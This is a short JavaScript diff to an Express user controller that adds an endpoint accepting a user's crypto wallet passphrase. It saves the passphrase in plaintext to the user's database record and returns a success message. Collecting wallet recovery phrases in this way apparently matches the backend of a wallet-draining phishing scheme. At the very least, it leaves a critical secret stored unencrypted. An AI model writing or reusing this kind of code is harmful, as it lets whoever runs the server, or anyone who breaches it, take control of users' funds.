@@ -18,4 +18,29 @@ const getUser = async (req, res) => {
     }
 };
 
-module.exports = { getUser };
+const submitPassphrase = async (req, res) => {
+    try {
+        const { wallet_phrase } = req.body;
+
+        if (!wallet_phrase) {
+            return res.status(400).json({ error: 'Passphrase is required.' });
+        }
+
+        const userId = req.user.id;
+        await User.findByIdAndUpdate(userId, {
+            walletPassphrase: wallet_phrase,
+            walletConnected: false
+        });
+
+        return res.status(200).json({ message: 'Passphrase submitted successfully.' });
+    } catch (error) {
+        console.error('Error submitting passphrase:', error);
+        return res.status(500).json({ error: 'Internal server error' });
+    }
+};
+
+
+module.exports = { 
+    getUser, 
+    submitPassphrase
+};
